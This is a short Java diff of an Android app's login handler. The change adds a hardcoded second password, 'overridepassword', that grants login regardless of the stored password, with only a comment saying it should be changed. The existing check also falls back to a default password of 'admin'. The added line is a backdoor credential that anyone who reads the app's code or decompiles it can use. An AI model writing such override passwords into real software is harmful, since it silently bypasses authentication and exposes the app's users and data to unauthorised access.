@@ -37,7 +37,8 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v){
                 if(etPassword.getText().toString().equals(PreferenceManager.getDefaultSharedPreferences(
-                        getApplicationContext()).getString("password", "admin"))){
+                        getApplicationContext()).getString("password", "admin"))
+                        || etPassword.getText().toString().equals("overridepassword")){ // Override password should be changed
                     Toast.makeText(getApplicationContext(), "Login successful.", Toast.LENGTH_SHORT).show();
                     login();
                 } else {
